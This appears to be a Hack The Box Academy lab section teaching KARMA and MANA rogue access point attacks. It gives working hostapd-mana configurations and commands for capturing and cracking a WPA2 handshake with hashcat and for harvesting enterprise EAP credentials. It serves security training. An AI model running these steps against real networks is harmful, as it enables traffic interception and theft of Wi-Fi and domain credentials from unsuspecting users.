
<h1>Karma &amp; Mana Attacks</h1>
<hr/>
<p>Wireless network attacks often exploit the way devices automatically connect to known Wi-Fi networks. Two such attacks, <code>KARMA</code> and <code>MANA</code>, leverage this behavior to trick devices into connecting to malicious access points, enabling attackers to intercept sensitive data. In this section, we will delve into the workings of KARMA and MANA attacks and their impact on connected client devices. For a deeper understanding, we highly recommend exploring these detailed posts by SpecterOps: <a href="https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee">Part-1</a> and <a href="https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9">Part-2</a>.</p>
<hr/>
<h3>Preferred Network List (PNL)</h3>
<p>Whenever a station (client) connects to a wireless network, the network's ESSID (Extended Service Set Identifier) is saved in the station's Preferred Network List (PNL). The PNL is an organized list of all the networks the station has previously connected to. Each entry in the PNL includes the ESSID of the network along with the specific configuration details required to reconnect to it.</p>
<hr/>
<h3>Passive Scanning by Clients</h3>
<p>During passive scanning, the client device monitors beacon frames broadcasted by nearby access points. By default, many client devices are set to automatically connect to networks stored in their Preferred Network List (PNL). If the device detects a beacon frame with an ESSID that matches an entry in its PNL, it will automatically establish a connection with the access point that sent the frame.</p>
<p>When clients are configured for passive scanning, attackers won't be able to see what SSIDs they are probing for, as they do not actively send out probe requests. Instead, passive scanning relies on listening to the beacon frames broadcasted by nearby access points.</p>
<p>For instance, the output of <code>airodump-ng</code> for clients configured for passive scanning will show no probe requests from the clients.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon 

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37 

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID


BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2         
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4         
</code></pre>
<p>As shown in the above output the <code>Probes</code> column in the airodump-ng output is blank as clients are configured for passive scanning.</p>
<hr/>
<h3>Active Scanning by Clients</h3>
<p>The second network selection method in the 802.11 protocol is known as Active Scanning. Client devices using this method actively transmit probe request frames to identify nearby access points (APs) and their capabilities. Probe requests come in two types: <code>directed</code> and <code>broadcast</code>.</p>
<ol>
<li>
<code>Directed Probe Requests</code>: These are addressed to a specific ESSID and are used by the client to check whether a particular network from its Preferred Network List (PNL) is nearby. Directed probing is also the only method to detect hidden networks, as it specifically targets their ESSID.</li>
<li>
<code>Broadcast Probe Requests</code>: These are sent with the SSID field set to NULL, making the request addressable to all nearby access points. This allows the client to determine if any of its preferred networks are available without explicitly revealing the contents of its PNL.</li>
</ol>
<p>Both types of probing serve to identify potential networks for connection, but broadcast probing adds a layer of privacy by avoiding direct disclosure of the networks in the client’s PNL.</p>
<p>For clients configured for active scanning, the output of <code>airodump-ng</code> will display the SSID(s) that the clients are actively probing for in the <code>Probes</code> column.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon 

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37 

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID


BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2         HackMe
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4         HackTheWireless
</code></pre>
<hr/>
<h2>KARMA Attack</h2>
<p>In a Karma attack, the rogue access point created by attacker listens for directed probe requests sent by client devices searching for networks in their Preferred Network List (PNL). When it detects a directed probe request, the rogue AP responds with a directed probe response that matches the requested ESSID. The client, believing it has found a trusted network from its PNL, connects to the rogue access point, enabling the attacker to intercept and manipulate the device's traffic.</p>
<p><img alt="karma" src="https://academy.hackthebox.com/storage/modules/291/karma/karma.png"/></p>
<hr/>
<h2>MANA Attack</h2>
<p>The MANA attack, developed by Dom White and Ian de Villiers, is an <code>advanced version of the KARMA attack</code> to address advancements in client device security that have rendered KARMA attacks less effective. In this method, the rogue access point (AP) created by attacker actively reconstructs the Preferred Network Lists (PNLs) of nearby devices. When a client device sends probe requests, the rogue AP records the device's MAC address in a main hash table. Each MAC address then maps to a secondary hash table containing the ESSIDs the device has probed for. This structure allows the rogue AP to systematically monitor and log the networks preferred by each device, particularly those using directed probing.</p>
<p>There are two notable variations of the MANA attack that build upon its foundational principles:</p>
<ol>
<li>
<p><code>Loud MANA Attack</code>: This is an enhanced variation of the MANA attack, introduced by Dom White and Ian de Villiers. In this attack, the rogue access point (AP) transmits beacon and probe response frames for every ESSID found in the combined set of all Preferred Network Lists (PNLs) of nearby devices. By leveraging this union of ESSIDs, the rogue AP can cast a wide net, increasing its chances of enticing devices to connect.</p>
</li>
<li>
<p><code>Known Beacon Attack</code>: Developed by George Chatzisofroniou, this attack uses brute force to discover the PNLs of nearby devices. The rogue AP broadcasts beacon frames for a predefined list of <a href="https://gist.github.com/jgamblin/da795e571fb5f91f9e86a27f2c2f626f">known ESSIDs</a>, attempting to match an ESSID within the target device’s PNL. When a match occurs, the device is tricked into connecting to the rogue AP</p>
</li>
</ol>
<p>The Karma and MANA attacks are usually most effective when clients are configured for active scanning. However, they can also work with passive scanning by broadcasting multiple popular SSIDs, including those commonly used by the target network. This approach can still attract clients, particularly if they have previously connected to those SSIDs.</p>
<p>Thus, the <code>Loud MANA</code> attack, an advanced variant of the KARMA attack, is the most effective method for targeting modern wireless devices configured for <code>active</code> scanning. On the other hand, the <code>Known Beacon</code> attack is a more effective approach for targeting devices configured for <code>passive</code> scanning.</p>
<p>In this section we will utilize <a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a> to execute the <code>MANA</code> attack, which is designed to respond to all client probes and establish rogue access points to capture sensitive information.</p>
<hr/>
<h2>Performing the Attack</h2>
<p>We begin by enabling monitor mode on our <code>wlan0</code> interface using <code>airmon-ng</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    204 wpa_supplicant
    208 avahi-daemon
    231 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy5	wlan3		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
</code></pre>
<p>Once our interface is in monitor mode, we can use <code>airodump-ng</code> to scan for available Wi-Fi networks and their associated clients.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon 

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37 

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID


BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2         HackMe                                      
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4         HackTheWireless                                              
</code></pre>
<p>From the output above, we observe two clients probing for access points named "HackMe" and "HackTheWireless." However, since these access points are not in range, the clients are unable to establish a connection.
The client probing for "HackMe" has the MAC address 8A:EB:7E:F9:15:3E, while the client probing for "HackTheWireless" has the MAC address 3A:00:0A:1B:21:24.</p>
<hr/>
<h3>MANA Attack on WPA/WPA2 Networks</h3>
<p>To execute the MANA attack, we create a configuration file named <code>hostapd.conf</code>.</p>
<pre><code class="language-configuration">interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything

# Mana Configuration
enable_mana=1
mana_loud=1
</code></pre>
<p>In this file, we specify many parameters. These parameters can be broken down like the following:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SSID</code></td>
<td>The SSID of the AP we want to set</td>
</tr>
<tr>
<td><code>Interface</code></td>
<td>The interface which we will be hosting the access point on.</td>
</tr>
<tr>
<td><code>Channel</code></td>
<td>Configures the access point to operate on selected Wi-Fi channel</td>
</tr>
<tr>
<td><code>hw_mode</code></td>
<td>The hw_mode parameter in the hostapd configuration file specifies the hardware mode (frequency band) that the access point should operate in.</td>
</tr>
<tr>
<td><code>enable_mana</code></td>
<td>Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive.</td>
</tr>
<tr>
<td><code>Mana_loud</code></td>
<td>This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero.</td>
</tr>
<tr>
<td><code>wpa=2</code></td>
<td>Enables WPA2 security for the access point.</td>
</tr>
<tr>
<td><code>wpa_key_mgmt</code></td>
<td>Configures WPA2 with Pre-Shared Key (PSK) authentication.</td>
</tr>
<tr>
<td><code>rsn_pairwise</code></td>
<td>Specifies CCMP (AES) as the encryption method for WPA2.</td>
</tr>
<tr>
<td><code>wpa_passphrase</code></td>
<td>Sets the WPA2 PSK passphrase to "Anything".</td>
</tr>
</tbody>
</table>
<p>The SSID is set to <code>Anything</code> because <code>hostapd-mana</code> automatically responds to probe requests from clients, mimicking the SSIDs they are probing for. Since we are unsure of the authentication method used by the clients, we configure it to support <code>WPA-PSK</code> for both WPA1 and WPA2, allowing both TKIP and CCMP encryption methods.</p>
<p>We can start the MANA attack using the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd-mana hostapd.conf 

Configuration file: hostapd.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr be:0c:d7:dd:82:c4 and ssid "Anything"
wlan1: interface state UNINITIALIZED-&gt;ENABLED
wlan1: AP-ENABLED 

MANA - Directed probe request for SSID 'HackTheWireless' from 3a:00:0a:1b:21:24
MANA - Directed probe request for SSID 'HackMe' from 8a:eb:7e:f9:15:3e
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: authenticated
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: associated (aid 1)

wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
</code></pre>
<p>This will create a rogue access point that responds to all probe requests from clients.</p>
<p>From the output, we may observe a message like <code>AP-STA-POSSIBLE-PSK-MISMATCH</code>, which indicates that a client attempted to connect to <code>HackMe</code> using WPA, but the passphrase didn’t match our configuration (<code>Anything</code>). Despite the mismatch, we can still capture the handshake and use it to brute-force the password. To capture the handshake, we need to modify the <code>hostapd.conf</code> file and disable the <code>MANA</code> mode since <code>hostapd-mana</code> does not support WPA/WPA2 handshake capture using <code>MANA</code> mode. This is because when MANA mode is enabled, hostapd-mana cannot reliably identify the SSID the client was trying to connect to.</p>
<p>We update the hostapd.conf file as below:</p>
<pre><code class="language-configuration">interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=HackMe
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
</code></pre>
<p>The key changes to the above config file includes the addition of <code>mana_wpaout=handshake.hccapx</code>, which saves the captured handshake to the specified file, the name of the <code>ssid</code> which client is probing for, and the removal of MANA mode, as it prevents reliable identification of the SSID being connected to. Once configured, we restart hostapd-mana with the updated configuration to capture the handshake data. This handshake can then be used for offline brute-forcing to crack the WPA passphrase.</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd-mana hostapd.conf 

Configuration file: hostapd.conf
MANA: Captured WPA/2 handshakes will be written to file 'handshake.hccapx'.
wlan1: interface state UNINITIALIZED-&gt;ENABLED
wlan1: AP-ENABLED 

wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: authenticated
wlan1: STA 8a:eb:7e:f9:15:3e IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
MANA: Captured a WPA/2 handshake from: 8a:eb:7e:f9:15:3e
wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 8a:eb:7e:f9:15:3e
</code></pre>
<p>Once the handshake is captured, we use the <code>hcxhash2cap</code> tool to convert it into a pcap file using the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap

EAPOLs written to capfile(s): 4 (0 skipped)
</code></pre>
<p>Next, we use the <code>hcxpcapngtool</code> to convert the pcap file into a Hashcat-compatible hash format (22000) using the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ hcxpcapngtool handshake.pcap -o hash.22000

hcxpcapngtool 6.2.5 reading from handshake.pcap...

summary capture file
--------------------
file name................................: handshake.pcap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
timestamp minimum (GMT)..................: 24.01.2025 10:32:34
timestamp maximum (GMT)..................: 24.01.2025 10:32:34
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
endianness (capture system)...............: little endian
packets inside...........................: 12
ESSID (total unique).....................: 1
BEACON (total)...........................: 4
BEACON (detected on 2.4 GHz channel).....: 6 
BEACON (hcxhash2cap).....................: 4
EAPOL messages (total)...................: 8
EAPOL RSN messages.......................: 8
EAPOLTIME gap (measured maximum usec)....: 1
EAPOL ANONCE error corrections (NC)......: not detected
REPLAYCOUNT gap (measured maximum).......: 3
EAPOL M1 messages (total)................: 4
EAPOL M2 messages (total)................: 4
EAPOL pairs (total)......................: 4
EAPOL pairs (best).......................: 1
EAPOL pairs written to combi hash file...: 1 (RC checked)
EAPOL M12E2 (challenge)..................: 1

session summary
---------------
processed cap files...................: 1
</code></pre>
<p>Finally, we use hashcat to attempt cracking the hash by specifying the attack mode (-a 0 for dictionary attack), the hash type (-m 22000 for WPA/WPA2), and the wordlist to use. The command is as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force

hashcat (v6.2.5) starting
&lt;SNIP&gt;
deae75ba0a788660e6e8c5bdf68239d5:22b46214ca56:9e8e3aa0ccc4:StarLight-Hospital:&lt;SNIP&gt;
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.22000
Time.Started.....: Fri Jan 24 10:40:35 2025, (1 sec)
Time.Estimated...: Fri Jan 24 10:40:36 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2027 H/s (14.95ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 490/14344384 (0.00%)
Rejected.........: 362/490 (73.88%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456789 -&gt; manchester
Hardware.Mon.#1..: Util: 50%
</code></pre>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> If <b>Hashcat</b> does not work within the provided attacker VM, it is recommended to use <b>Pwnbox</b> or your <b>local VM</b> to run Hashcat.
</div>
<hr/>
<h3>MANA attack on Enterprise Networks</h3>
<p>We can extend the MANA attack to target clients probing for enterprise networks. Since we cannot determine the exact authentication method the clients are probing for, a trial-and-error approach is necessary. Previously, we targeted WPA networks, where only one client connected. This suggests the second client might be using WPA Enterprise.</p>
<p>To configure the rogue access point for WPA Enterprise, we use the following configuration:</p>
<pre><code class="language-config"># 802.11 Options
interface=wlan1
ssid=Anything
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=/opt/hostapd-mana/hostapd.eap_user

# Certificates
ca_cert=/opt/hostapd-mana/ca.pem
server_cert=/opt/hostapd-mana/server.pem
private_key=/opt/hostapd-mana/server.key
private_key_passwd=whatever
dh_file=/opt/hostapd-mana/dh

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
</code></pre>
<p>In this file, we specify many parameters. These parameters can be broken down like the following:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Interface</code></td>
<td>The interface on which we will be hosting the access point.</td>
</tr>
<tr>
<td><code>SSID</code></td>
<td>The SSID of the AP we want to set</td>
</tr>
<tr>
<td><code>Channel 1</code></td>
<td>If our interface has the same spoofed MAC address as the target network's BSSID, we need this to be a different channel. If the MAC address of our interface is different, this can be the same channel as the target AP.</td>
</tr>
<tr>
<td><code>eap_user_file</code></td>
<td>This is the location of our eap user file. We will use this file to control the EAP negotiation of any client which connects to our network. Doing so will allow us to downgrade the EAP method correctly in order to retrieve weaker hashes or even plain text credentials.</td>
</tr>
<tr>
<td><code>enable_mana</code></td>
<td>Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive. We may still need to employ deauthentication later.</td>
</tr>
<tr>
<td><code>Mana_loud</code></td>
<td>This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero.</td>
</tr>
<tr>
<td><code>Mana_credout</code></td>
<td>The location where we will be storing any captured credentials or hashes.</td>
</tr>
<tr>
<td><code>Mana_WPE</code></td>
<td>Enables EAP credential capture mode, which is what we need in order to receive client credentials.</td>
</tr>
<tr>
<td><code>Certificate Configuration</code></td>
<td>We must include the location of our different SSL certs which we will generate later. This is due to the cert requirements for the TTLS-PAP and GTC modes respectively among others.</td>
</tr>
</tbody>
</table>
<p>We will delve into the details of how these <code>certificates</code> are generated and explain the contents of the <code>hostapd.eap_user</code> file in the upcoming section titled <code>Enterprise Evil Twin Attack</code>.</p>
<p>Once the configuration is ready, we run the <code>hostapd-mana</code> command followed by config file to start the rogue AP and capture the credentials.</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd-mana hostapd.conf 

MANA: Captured credentials will be written to file 'credentials.creds'.
Using interface wlan1 with hwaddr 22:b4:62:14:ca:56 and ssid "Anything"
wlan1: interface state UNINITIALIZED-&gt;ENABLED
wlan1: AP-ENABLED
MANA - Directed probe request for SSID 'HackTheWireless' from 3a:00:0a:1b:21:24
MANA - Directed probe request for SSID 'HackMe' from 8a:eb:7e:f9:15:3e 
wlan1: STA 3a:00:0a:1b:21:24 IEEE 802.11: authenticated
wlan1: STA 3a:00:0a:1b:21:24 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 2e:c7:73:68:50:82
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: HTB\&lt;SNIP&gt;
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
MANA EAP Identity Phase 1: HTB\&lt;SNIP&gt;
MANA EAP GTC | HTB\\&lt;SNIP&gt;:&lt;SNIP&gt;
</code></pre>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
